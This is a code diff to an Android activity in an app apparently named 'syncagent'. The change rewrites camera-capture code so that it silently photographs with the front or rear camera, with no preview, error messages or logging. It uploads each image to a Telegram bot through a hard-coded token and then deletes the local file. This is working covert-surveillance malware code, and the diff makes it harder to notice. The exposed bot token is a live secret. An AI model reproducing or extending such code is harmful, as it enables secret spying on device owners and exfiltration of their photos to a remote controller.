@@ -1,210 +1,150 @@
 package com.cognitive.ai.syncagent
 
 import android.app.Activity
-import android.content.pm.PackageManager
-import android.hardware.Camera
-import android.os.Bundle
-import android.util.Log
-import android.view.SurfaceHolder
-import android.view.SurfaceView
-import org.json.JSONObject
+import android.content.Context
+import android.graphics.ImageFormat
+import android.hardware.camera2.*
+import android.media.ImageReader
+import android.os.*
+import java.io.File
+import java.io.FileOutputStream
 import java.net.HttpURLConnection
 import java.net.URL
 import kotlin.concurrent.thread
 
-@Suppress("DEPRECATION")
-class CameraCaptureActivity : Activity(), SurfaceHolder.Callback {
+class CameraCaptureActivity : Activity() {
 
-    companion object {
-        private const val TAG = "CameraCaptureAct"
-        private const val BOT_TOKEN = "9004970470:AAFN2VS-MzpUQ6oEbtHu5THzcQBYQZHmAkY"
-    }
-
-    private var camera: Camera? = null
-    private lateinit var surfaceView: SurfaceView
-    private lateinit var surfaceHolder: SurfaceHolder
-    private var chatId: String = ""
-    private var isCapturing = false
+    private var cameraDevice: CameraDevice? = null
+    private val handlerThread = HandlerThread("CameraCaptureThread").apply { start() }
+    private val backgroundHandler = Handler(handlerThread.looper)
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        chatId = intent.getStringExtra("chat_id") ?: ""
+        val chatId = intent.getStringExtra("chat_id") ?: return finish()
+        val cameraFacing = intent.getStringExtra("camera_facing") ?: "front"
 
-        if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
-            sendStatusMessage(chatId, "⚠️ صلاحية الكاميرا غير ممنوحة للتطبيق.")
-            finish()
-            return
-        }
-
-        surfaceView = SurfaceView(this)
-        setContentView(surfaceView)
-
-        surfaceHolder = surfaceView.holder
-        surfaceHolder.addCallback(this)
-    }
-
-    override fun surfaceCreated(holder: SurfaceHolder) {
-        if (isCapturing) return
+        val manager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
         try {
-            val frontCameraId = findFrontCameraId()
-            if (frontCameraId == -1) {
-                sendStatusMessage(chatId, "⚠️ لم يتم العثور على كاميرا أمامية في الجهاز.")
-                releaseCameraAndFinish()
-                return
+            var targetCameraId = manager.cameraIdList[0]
+            for (id in manager.cameraIdList) {
+                val characteristics = manager.getCameraCharacteristics(id)
+                val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
+                if (cameraFacing == "front" && facing == CameraCharacteristics.LENS_FACING_FRONT) {
+                    targetCameraId = id
+                    break
+                } else if (cameraFacing == "rear" && facing == CameraCharacteristics.LENS_FACING_BACK) {
+                    targetCameraId = id
+                    break
+                }
             }
 
-            camera = Camera.open(frontCameraId)
-            camera?.setPreviewDisplay(holder)
-            camera?.startPreview()
+            manager.openCamera(targetCameraId, object : CameraDevice.StateCallback() {
+                override fun onOpened(camera: CameraDevice) {
+                    cameraDevice = camera
+                    val reader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 2)
+                    reader.setOnImageAvailableListener({ imgReader ->
+                        val image = imgReader.acquireLatestImage()
+                        if (image != null) {
+                            val buffer = image.planes[0].buffer
+                            val bytes = ByteArray(buffer.remaining())
+                            buffer.get(bytes)
+                            image.close()
 
-            surfaceView.postDelayed({
-                if (isCapturing) return@postDelayed
-                isCapturing = true
-                try {
-                    camera?.takePicture(null, null, Camera.PictureCallback { data, _ ->
-                        releaseCameraOnly()
-                        if (data != null && data.isNotEmpty()) {
-                            thread(name = "UploadPhotoThread") {
-                                uploadPhotoToTelegram(data)
-                            }
-                        } else {
-                            sendStatusMessage(chatId, "⚠️ لم يتم استلام بيانات الصورة من الكاميرا.")
+                            val photoFile = File(cacheDir, "photo_${System.currentTimeMillis()}.jpg")
+                            try {
+                                FileOutputStream(photoFile).use { it.write(bytes) }
+                                if (photoFile.exists() && photoFile.length() > 0) {
+                                    uploadPhotoToTelegram(chatId, photoFile)
+                                }
+                            } catch (_: Exception) {}
+                            
+                            closeCameraAndFinish()
                         }
-                        finish()
-                    })
-                } catch (e: Exception) {
-                    Log.e(TAG, "takePicture failed", e)
-                    sendStatusMessage(chatId, "⚠️ فشل التقاط الصورة: ${e.message}")
-                    releaseCameraAndFinish()
+                    }, backgroundHandler)
+
+                    try {
+                        val surface = reader.surface
+                        camera.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
+                            override fun onConfigured(session: CameraCaptureSession) {
+                                try {
+                                    val captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
+                                        addTarget(surface)
+                                        set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
+                                    }
+                                    session.capture(captureBuilder.build(), null, backgroundHandler)
+                                } catch (_: Exception) {
+                                    closeCameraAndFinish()
+                                }
+                            }
+                            override fun onConfigureFailed(session: CameraCaptureSession) {
+                                closeCameraAndFinish()
+                            }
+                        }, backgroundHandler)
+                    } catch (_: Exception) {
+                        closeCameraAndFinish()
+                    }
                 }
-            }, 1500)
 
-        } catch (e: Exception) {
-            Log.e(TAG, "Camera open failed", e)
-            sendStatusMessage(chatId, "⚠️ تعذر فتح الكاميرا: ${e.message}")
-            releaseCameraAndFinish()
-        }
-    }
-
-    private fun findFrontCameraId(): Int {
-        val numberOfCameras = Camera.getNumberOfCameras()
-        val cameraInfo = Camera.CameraInfo()
-        for (i in 0 until numberOfCameras) {
-            Camera.getCameraInfo(i, cameraInfo)
-            if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
-                return i
-            }
-        }
-        return if (numberOfCameras > 0) 0 else -1
-    }
-
-    private fun uploadPhotoToTelegram(data: ByteArray) {
-        if (chatId.isBlank()) {
-            Log.e(TAG, "Missing chatId for photo upload")
-            return
-        }
-
-        var connection: HttpURLConnection? = null
-        try {
-            val boundary = "Boundary_" + System.currentTimeMillis()
-            val lineEnd = "\r\n"
-            val twoHyphens = "--"
-
-            val url = URL("https://api.telegram.org/bot$BOT_TOKEN/sendPhoto")
-            connection = url.openConnection() as HttpURLConnection
-            connection.doOutput = true
-            connection.doInput = true
-            connection.useCaches = false
-            connection.requestMethod = "POST"
-            connection.connectTimeout = 15000
-            connection.readTimeout = 30000
-            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
-
-            connection.outputStream.use { out ->
-                out.write((twoHyphens + boundary + lineEnd).toByteArray(Charsets.UTF_8))
-                out.write("Content-Disposition: form-data; name=\"chat_id\"$lineEnd$lineEnd".toByteArray(Charsets.UTF_8))
-                out.write((chatId + lineEnd).toByteArray(Charsets.UTF_8))
-
-                out.write((twoHyphens + boundary + lineEnd).toByteArray(Charsets.UTF_8))
-                out.write("Content-Disposition: form-data; name=\"photo\"; filename=\"photo.jpg\"$lineEnd".toByteArray(Charsets.UTF_8))
-                out.write("Content-Type: image/jpeg$lineEnd$lineEnd".toByteArray(Charsets.UTF_8))
-                out.write(data)
-                out.write(lineEnd.toByteArray(Charsets.UTF_8))
-
-                out.write((twoHyphens + boundary + twoHyphens + lineEnd).toByteArray(Charsets.UTF_8))
-                out.flush()
-            }
-
-            val code = connection.responseCode
-            val stream = if (code == 200) connection.inputStream else connection.errorStream
-            val responseText = stream?.bufferedReader()?.use { it.readText() } ?: ""
-            Log.d(TAG, "sendPhoto response ($code): $responseText")
-
-            val ok = try {
-                JSONObject(responseText).optBoolean("ok", false)
-            } catch (_: Exception) {
-                false
-            }
-
-            if (code != 200 || !ok) {
-                sendStatusMessage(chatId, "⚠️ فشل إرسال الصورة إلى تيليجرام (رمز $code).")
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "uploadPhotoToTelegram error", e)
-            sendStatusMessage(chatId, "⚠️ خطأ أثناء رفع الصورة: ${e.message}")
-        } finally {
-            connection?.disconnect()
-        }
-    }
-
-    private fun sendStatusMessage(targetChatId: String, text: String) {
-        if (targetChatId.isBlank()) return
-        thread(name = "CameraStatusMsg") {
-            var conn: HttpURLConnection? = null
-            try {
-                val body = JSONObject().apply {
-                    put("chat_id", targetChatId)
-                    put("text", text)
+                override fun onDisconnected(camera: CameraDevice) {
+                    camera.close()
+                    cameraDevice = null
+                    finish()
                 }
-                conn = URL("https://api.telegram.org/bot$BOT_TOKEN/sendMessage").openConnection() as HttpURLConnection
-                conn.requestMethod = "POST"
-                conn.doOutput = true
-                conn.connectTimeout = 10000
-                conn.readTimeout = 15000
-                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
-                conn.outputStream.use { it.write(body.toString().toByteArray(Charsets.UTF_8)) }
-                conn.inputStream?.close()
-            } catch (e: Exception) {
-                Log.e(TAG, "sendStatusMessage error", e)
-            } finally {
-                conn?.disconnect()
-            }
+
+                override fun onError(camera: CameraDevice, error: Int) {
+                    camera.close()
+                    cameraDevice = null
+                    finish()
+                }
+            }, backgroundHandler)
+
+        } catch (_: Exception) {
+            finish()
         }
     }
 
-    private fun releaseCameraOnly() {
+    private fun closeCameraAndFinish() {
         try {
-            camera?.stopPreview()
-            camera?.release()
-            camera = null
-        } catch (e: Exception) {
-            Log.e(TAG, "releaseCameraOnly error", e)
-        }
-    }
-
-    private fun releaseCameraAndFinish() {
-        releaseCameraOnly()
+            cameraDevice?.close()
+            cameraDevice = null
+        } catch (_: Exception) {}
         finish()
     }
 
-    override fun surfaceChanged(holder: SurfaceHolder, format: Int, width: Int, height: Int) {}
+    private fun uploadPhotoToTelegram(chatId: String, file: File) {
+        thread {
+            var connection: HttpURLConnection? = null
+            try {
+                val boundary = "Boundary_${System.currentTimeMillis()}"
+                val url = URL("https://api.telegram.org/bot9004970470:AAFN2VS-MzpUQ6oEbtHu5THzcQBYQZHmAkY/sendPhoto")
+                connection = url.openConnection() as HttpURLConnection
+                connection.doOutput = true
+                connection.requestMethod = "POST"
+                connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
 
-    override fun surfaceDestroyed(holder: SurfaceHolder) {
-        releaseCameraOnly()
+                java.io.DataOutputStream(connection.outputStream).use { out ->
+                    out.write("--$boundary\r\n".toByteArray())
+                    out.write("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n".toByteArray())
+                    out.write("$chatId\r\n".toByteArray())
+
+                    out.write("--$boundary\r\n".toByteArray())
+                    out.write("Content-Disposition: form-data; name=\"photo\"; filename=\"${file.name}\"\r\n".toByteArray())
+                    out.write("Content-Type: image/jpeg\r\n\r\n".toByteArray())
+
+                    java.io.FileInputStream(file).use { it.copyTo(out) }
+                    out.write("\r\n--$boundary--\r\n".toByteArray())
+                }
+                connection.inputStream?.close()
+            } catch (_: Exception) {
+            } finally {
+                connection?.disconnect()
+                if (file.exists()) file.delete()
+            }
+        }
     }
 
     override fun onDestroy() {
-        releaseCameraOnly()
         super.onDestroy()
+        handlerThread.quitSafely()
     }
 }
